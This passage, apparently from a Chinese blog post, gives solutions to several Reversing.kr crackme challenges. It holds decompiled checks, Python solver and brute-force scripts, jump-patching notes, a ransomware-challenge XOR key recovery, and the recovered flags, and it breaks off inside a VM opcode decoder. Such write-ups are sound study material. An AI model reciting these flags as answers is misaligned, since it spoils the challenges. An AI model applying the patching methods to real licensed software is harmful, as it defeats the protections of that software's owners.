class="line">      bmi.bmiHeader.biBitCount = <span class="number">24</span>;</span><br><span class="line">      bmi.bmiHeader.biCompression = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">GetDIBits</span>(hdc, (HBITMAP)hbm, <span class="number">0</span>, cLines, <span class="number">0</span>, &amp;bmi, <span class="number">0</span>);</span><br><span class="line">      v8 = <span class="keyword">operator</span> <span class="built_in">new</span>(bmi.bmiHeader.biSizeImage);</span><br><span class="line">      <span class="built_in">GetDIBits</span>(hdc, (HBITMAP)hbm, <span class="number">0</span>, cLines, v8, &amp;bmi, <span class="number">0</span>);</span><br><span class="line">      ResourceA = <span class="built_in">FindResourceA</span>(<span class="number">0</span>, (LPCSTR)<span class="number">101</span>, (LPCSTR)<span class="number">0x18</span>);</span><br><span class="line">      Resource = <span class="built_in">LoadResource</span>(<span class="number">0</span>, ResourceA);</span><br><span class="line">      v11 = <span class="built_in">LockResource</span>(Resource);</span><br><span class="line">      v12 = <span class="number">0</span>;</span><br><span class="line">      v13 = v8;</span><br><span class="line">      v14 = v11 - (_BYTE *)v8;</span><br><span class="line">      <span class="keyword">while</span> ( *v13 == v13[v14] )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v12;</span><br><span class="line">        ++v13;</span><br><span class="line">        <span class="keyword">if</span> ( v12 &gt;= <span class="number">90000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">sub_401500</span>(v8);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">MessageBoxA</span>(hWnd, Text, Caption, <span class="number">0x30</span>u);</span><br><span class="line">      <span class="built_in">sub_401500</span>(v8);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以知道是将读取的图像与LoadResource里加载的进行对比 有90000个相同即正确<br>这种直接ResourceHacker将101资源提取出来 python将FF转成字节写入bin 然后PIL库操作即可:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;FF...FF&quot;</span></span><br><span class="line">s = s.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\asus\Desktop\Python\dump.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        c = c.strip()</span><br><span class="line">        <span class="keyword">if</span>(c!=<span class="string">&quot; &quot;</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># print(c)</span></span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">                f.write(long_to_bytes(<span class="built_in">int</span>(c,<span class="number">16</span>)))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">width = <span class="number">200</span></span><br><span class="line">height = <span class="number">150</span></span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">r&#x27;C:\Users\asus\Desktop\Python\dump.bin&#x27;</span>, <span class="string">&#x27;rb+&#x27;</span>)</span><br><span class="line">data = fp.read()</span><br><span class="line">im = Image.frombytes(<span class="string">&#x27;RGB&#x27;</span>, (width, height), data)</span><br><span class="line">im = im.transpose(Image.FLIP_TOP_BOTTOM)</span><br><span class="line">im.show()</span><br><span class="line">im.save(<span class="string">&#x27;result.bmp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到图片:<br><img src="https://s2.loli.net/2024/01/17/Up12b3Fh8C9SWxz.png" alt="img"></p><p>flag:<br><strong>GOT</strong></p><h1 id="Direct3D-FPS"><a href="#Direct3D-FPS" class="headerlink" title="Direct3D FPS"></a>Direct3D FPS</h1><p>逆向很简单 学到了一点:用IDC&#x2F;IDApython 提取数据</p><p>很容易根据关键字符跟到这里:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __thiscall <span class="title">SUPRISE</span><span class="params">(<span class="type">void</span> *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">sub_A23440</span>(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = dword_A29190[<span class="number">132</span> * result];</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_A29190[<span class="number">132</span> * result] = v2 - <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      dword_A29194[<span class="number">132</span> * result] = <span class="number">0</span>;           <span class="comment">// 标记清零 代表这个地方上的怪被清了</span></span><br><span class="line">                                                <span class="comment">// 在另一个函数里统计 是否 Game Clear</span></span><br><span class="line">      byte_A27028[result] ^= byte_A29184[<span class="number">528</span> * result];<span class="comment">// 这应该就是加密的flag</span></span><br><span class="line">                                                <span class="comment">// 确实在后面检测到GameClear后会将这个作为lptext传入参数 输出 所以关键就是怎么找到密钥</span></span><br><span class="line">                                                <span class="comment">// 只是它不是同一个key加密的 貌似</span></span><br><span class="line">                                                <span class="comment">// 应该是 一个key[]数组 </span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后有个小坑点: 这个byte_A29184是动态赋值的 也就是要把游戏开着再来找数据…(想起当时在车上逆的 没开游戏…)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">    <span class="built_in">Message</span>(<span class="string">&quot;%d &quot;</span>,<span class="built_in">Byte</span>(<span class="number">0xa29184</span>+<span class="number">528</span>*i));</span><br></pre></td></tr></table></figure><p>发现就是 4*i<br>这样xor回去即可<br>得到:<br>Congratulation~ Game Clear! Password is Thr3EDPr0m</p><p>flag:<br><strong>Thr3EDPr0m</strong></p><p>应该还有patch游戏无敌后硬打的解法  以后再来试吧~</p><h1 id="Position"><a href="#Position" class="headerlink" title="Position"></a>Position</h1><p>mfc 找到关键逻辑<br><img src="/./Reversing-Kr%E7%BB%83%E4%B9%A0/images/1.png" alt="img"></p><p>check逻辑就是name的四个字符1,2 3,4 两组 进行check 跟序列号比较<br>没什么技术含量 直接爆破<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Re.kr Position</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Find the Name when the Serial is 76876-77776</span></span><br><span class="line"><span class="string">This problem has several answers.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password is ***p</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">一共四个字符 1,2 3,4 两组check</span></span><br><span class="line"><span class="string">本来如果能直接枚举爆破process是最快的 但是不怎么会这种mfc填空类似的爆破...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwyxz&quot;</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> table:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> table:</span><br><span class="line">        v6 = <span class="built_in">ord</span>(i1)</span><br><span class="line">        v7 = <span class="built_in">ord</span>(i2)</span><br><span class="line">        v40 = (v6 &amp; <span class="number">1</span>) + <span class="number">5</span></span><br><span class="line">        v48 = ((v6 &amp; <span class="number">0x10</span>) != <span class="number">0</span>) + <span class="number">5</span></span><br><span class="line">        v42 = ((v6 &amp; <span class="number">2</span>) != <span class="number">0</span>) + <span class="number">5</span></span><br><span class="line">        v44 = ((v6 &amp; <span class="number">4</span>) != <span class="number">0</span>) + <span class="number">5</span></span><br><span class="line">        v46 = ((v6 &amp; <span class="number">8</span>) != <span class="number">0</span>) + <span class="number">5</span></span><br><span class="line"></span><br><span class="line">        v32 = (v7 &amp; <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">        v38 = ((v7 &amp; <span class="number">0x10</span>) != <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">        v34 = ((v7 &amp; <span class="number">2</span>) != <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">        v8 = ((v7 &amp; <span class="number">4</span>) != <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">        v36 = ((v7 &amp; <span class="number">8</span>) != <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">        <span class="comment"># 76876-77776</span></span><br><span class="line">        <span class="keyword">if</span>((v8+v40)==<span class="number">7</span>):</span><br><span class="line">            <span class="keyword">if</span>((v46+v36)==<span class="number">7</span>):</span><br><span class="line">                <span class="keyword">if</span>((v42+v38)==<span class="number">7</span>):</span><br><span class="line">                    <span class="keyword">if</span>(v44+v32==<span class="number">7</span>):</span><br><span class="line">                        <span class="keyword">if</span>(v48+v32==<span class="number">6</span>):</span><br><span class="line">                            <span class="built_in">print</span>(i1,i2,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ftmp</span></span><br><span class="line"><span class="string">fvmp</span></span><br><span class="line"><span class="string">gpmp</span></span><br><span class="line"><span class="string">grmp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/./Reversing-Kr%E7%BB%83%E4%B9%A0/images/2.png" alt="image"><br>但离谱的是auth不对。。。 就离谱…</p><h1 id="Music-Player"><a href="#Music-Player" class="headerlink" title="Music_Player"></a>Music_Player</h1><p>Readme要求让播放器播放&gt;1min<br>自己瞎patch了一堆… 结果不如直接改两个jmp<br><a href="https://github.com/DoubleLabyrinth/reversing.kr/blob/master/Music%20Player/README.md">++++++</a></p><p>记得patch jmp后把后面一个字节改为nop<br>还是学到了一个关键点 要跳过<code>_vbaHresultCheckObj</code>的执行<br>这个貌似是VB程序的一些<code>反xx</code>的措施? 搜了一圈也没搜到具体的作用 长见识了</p><blockquote><p><img src="/./Reversing-Kr%E7%BB%83%E4%B9%A0/images/3.png" alt="image"></p></blockquote><blockquote><p><img src="/./Reversing-Kr%E7%BB%83%E4%B9%A0/images/4.png" alt="image"></p></blockquote><blockquote><p><img src="/./Reversing-Kr%E7%BB%83%E4%B9%A0/images/5.png" alt="image"></p></blockquote><h1 id="Ransomware"><a href="#Ransomware" class="headerlink" title="Ransomware"></a>Ransomware</h1><p>勒索病毒~</p><p>先virustool分析一波<br><img src="/./Reversing-Kr%E7%BB%83%E4%B9%A0/images/6.png" alt="image"><br>楽</p><p>看一看加密的file文件<br><img src="/./Reversing-Kr%E7%BB%83%E4%B9%A0/images/7.png" alt="image"></p><p>妥妥的PE结构<br>看run.exe<br>F5不了 因为加了很多很多无意义的花指令<br>输入key:<br><img src="/./Reversing-Kr%E7%BB%83%E4%B9%A0/images/8.png" alt="image"></p><p>加密:<br><img src="/./Reversing-Kr%E7%BB%83%E4%B9%A0/images/9.png" alt="image"></p><p>这个xor 0xFF 就是 ~<br>加密过程就是 与输入的key循环xor后取反<br>选取PE头部分 去反后与已知的PE头结构xor<br><code>letsplaychessletsplaychessletsplaychessletsplaychessletsplayiessletsplaychessle</code></p><p>key: <code>letsplaychess</code><br>对应解密即可得到一个UPX加壳的PE文件 脱壳后找到key<br><img src="/./Reversing-Kr%E7%BB%83%E4%B9%A0/images/10.png" alt="image"></p><p><strong>Colle System</strong></p><h1 id="CRC1"><a href="#CRC1" class="headerlink" title="CRC1"></a>CRC1</h1><p>主算法:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">GetDlgItemTextA</span>(hDlg, <span class="number">1000</span>, &amp;INPUT, <span class="number">20</span>) != <span class="number">8</span> )<span class="comment">// len=8</span></span><br><span class="line">  <span class="keyword">goto</span> LABEL_9;</span><br><span class="line"><span class="built_in">strcpy</span>(&amp;v17, aHelloWelcomeTo);</span><br><span class="line">v1 = <span class="number">0</span>;</span><br><span class="line">v2 = &amp;v17;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v3 = *(&amp;INPUT + v1++);</span><br><span class="line">  *v2 = v3;</span><br><span class="line">  v2 += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v1 &lt; <span class="number">8</span> );                             <span class="comment">// 将Helloxxx这个字符串隔16位赋为input[i]</span></span><br><span class="line">v4 = <span class="number">0</span>i64;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v6 = (<span class="type">unsigned</span> __int8)v4 ^ (<span class="type">unsigned</span> __int8)*(&amp;v17 + i);</span><br><span class="line">  v7 = v4 &gt;&gt; <span class="number">8</span>;</span><br><span class="line">  <span class="built_in">LODWORD</span>(v4) = v7 ^ dword_4085E8[<span class="number">2</span> * v6];</span><br><span class="line">  v8 = <span class="built_in">HIDWORD</span>(v7) ^ dword_4085EC[<span class="number">2</span> * v6];</span><br><span class="line">  <span class="built_in">HIDWORD</span>(v4) = v8;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( (_DWORD)v4 == <span class="number">1600741228</span> &amp;&amp; v8 == <span class="number">1735352167</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">MessageBeep</span>(<span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">SetDlgItemTextA</span>(hDlg, <span class="number">1001</span>, aCorrect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>z3正向无法处理下标v6的情况… (可能有方法?)</p><p>只能老老实实逆向了…</p><p>(不是很会啊…)</p><h1 id="CSHARP"><a href="#CSHARP" class="headerlink" title="CSHARP"></a>CSHARP</h1><p>一个C#程序 dnspy打开看</p><p>采用了一些Dynamic的函数调用 静态一团雾水… dnspy动调</p><p>在 <code>method.invoke</code> 下断点然后 <code>F11</code>步过 一定要等程序把动态定义的函数加载出来！！！</p><p>最开始我没有步入… C#逆向经验少了 然后一直<code>F11</code> 终于加载出真正的<code>MetM</code>函数</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x02000002 RID: 2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">RevKrT2</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Token: 0x06000001 RID: 1</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">MetM</span>(<span class="params"><span class="built_in">byte</span>[] A_0, <span class="built_in">byte</span>[] A_1</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (A_1.Length == <span class="number">12</span>)</span><br><span class="line">&#123;</span><br><span class="line">A_0[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> ((A_1[<span class="number">0</span>] ^ <span class="number">16</span>) != <span class="number">74</span>)</span><br><span class="line">&#123;</span><br><span class="line">A_0[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((A_1[<span class="number">3</span>] ^ <span class="number">51</span>) != <span class="number">70</span>)</span><br><span class="line">&#123;</span><br><span class="line">A_0[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((A_1[<span class="number">1</span>] ^ <span class="number">17</span>) != <span class="number">87</span>)</span><br><span class="line">&#123;</span><br><span class="line">A_0[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((A_1[<span class="number">2</span>] ^ <span class="number">33</span>) != <span class="number">77</span>)</span><br><span class="line">&#123;</span><br><span class="line">A_0[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((A_1[<span class="number">11</span>] ^ <span class="number">17</span>) != <span class="number">44</span>)</span><br><span class="line">&#123;</span><br><span class="line">A_0[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((A_1[<span class="number">8</span>] ^ <span class="number">144</span>) != <span class="number">241</span>)</span><br><span class="line">&#123;</span><br><span class="line">A_0[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((A_1[<span class="number">4</span>] ^ <span class="number">68</span>) != <span class="number">29</span>)</span><br><span class="line">&#123;</span><br><span class="line">A_0[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((A_1[<span class="number">5</span>] ^ <span class="number">102</span>) != <span class="number">49</span>)</span><br><span class="line">&#123;</span><br><span class="line">A_0[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((A_1[<span class="number">9</span>] ^ <span class="number">181</span>) != <span class="number">226</span>)</span><br><span class="line">&#123;</span><br><span class="line">A_0[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((A_1[<span class="number">7</span>] ^ <span class="number">160</span>) != <span class="number">238</span>)</span><br><span class="line">&#123;</span><br><span class="line">A_0[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((A_1[<span class="number">10</span>] ^ <span class="number">238</span>) != <span class="number">163</span>)</span><br><span class="line">&#123;</span><br><span class="line">A_0[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((A_1[<span class="number">6</span>] ^ <span class="number">51</span>) != <span class="number">117</span>)</span><br><span class="line">&#123;</span><br><span class="line">A_0[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>逆向就简单了 注意下顺序 逆回去再b64解就行了</p><p><strong>dYnaaMic</strong></p><h1 id="SimpleVM"><a href="#SimpleVM" class="headerlink" title="SimpleVM"></a>SimpleVM</h1><p>IDA打开会报错 说入口点损坏<br>学到一个方法： 利用Linux下的dbg运行然后dump出来</p><p>无论是<code>peda</code>还是<code>pwndbg</code>都不好下断点<br>但是可以<code>r</code> 出现<code>input</code>后 <code>ctrl+c</code><br>然后用<code>gcore</code> dump出来<br><img src="/Reversing-Kr%E7%BB%83%E4%B9%A0/images/image.png" alt="img"><br>IDA再看就行了<br><img src="/Reversing-Kr%E7%BB%83%E4%B9%A0/images/image-1.png" alt="img"></p><p>只要能正常反编译就能逆<br>但这种dump出来的要注意是不能动调的 因为这是core而不是纯正的elf Linux是执行不了的<br>而且这个VM写的真的比较怪…<br>而且这个opcode的数组在前面修改过<br><img src="/Reversing-Kr%E7%BB%83%E4%B9%A0/images/image-2.png" alt="img"></p><p><img src="/Reversing-Kr%E7%BB%83%E4%B9%A0/images/image-3.png" alt="img"><br>看似奇怪的<code>gen</code> 其实就是执行的 <code>IR++</code> 操作<br><img src="/Reversing-Kr%E7%BB%83%E4%B9%A0/images/image-4.png" alt="img"><br><img src="/Reversing-Kr%E7%BB%83%E4%B9%A0/images/image-5.png" alt="img"><br><img src="/Reversing-Kr%E7%BB%83%E4%B9%A0/images/image-6.png" alt="img"><br><img src="/Reversing-Kr%E7%BB%83%E4%B9%A0/images/image-7.png" alt="img"><br><img src="/Reversing-Kr%E7%BB%83%E4%B9%A0/images/image-8.png" alt="img"></p><p>打印对应的opcode 写出逆向解密代码:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">table = [...]</span><br><span class="line">table = table[:<span class="number">200</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    table[i] = ((table[i] &lt;&lt; <span class="number">3</span>) | (table[i] &gt;&gt; (<span class="number">8</span> - <span class="number">3</span>))) &amp; <span class="number">0xff</span></span><br><span class="line">    table[i] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    table[i] &amp;= <span class="number">0xff</span></span><br><span class="line">    table[i] ^= <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># table = opcodes</span></span><br><span class="line">ip = table[<span class="number">9</span>]</span><br><span class="line">opcode = table</span><br><span class="line"><span class="keyword">while</span> ip&lt;<span class="number">200</span>:</span><br><span class="line">    op = opcode[ip]</span><br><span class="line">    <span class="keyword">if</span> op==<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;ip&#125;</span> mov ptr[<span class="subst">&#123;opcode[ip+<span class="number">1</span>]&#125;</span>] <span class="subst">&#123;opcode[ip+<span class="number">2</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">        ip += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">6</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ip&#125;</span> xor ptr[<span class="subst">&#123;opcode[ip+<span class="number">1</span>]&#125;</span>] ptr[<span class="subst">&#123;opcode[ip+<span class="number">2</span>]&#125;</span>]&quot;</span>)</span><br><span class="line">        ip += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">7</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ip&#125;</span> cmp ptr[<span class="subst">&#123;opcode[ip+<span class="number">1</span>]&#125;</span>] ptr[<span class="subst">&#123;opcode[ip+<span class="number">2</span>]&#125;</span>]&quot;</span>)</span><br><span class="line">        ip += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">9</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ip&#125;</span> jnz ptr[<span class="subst">&#123;opcode[ip+<span class="number">1</span>]&#125;</span>]&quot;</span>)</span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ip&#125;</span> jmp xxx&quot;</span>)</span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">11</span>:</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">val = [<span class="number">9</span>,<span class="number">2</span>,<span class="number">21</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">7</span>,<span 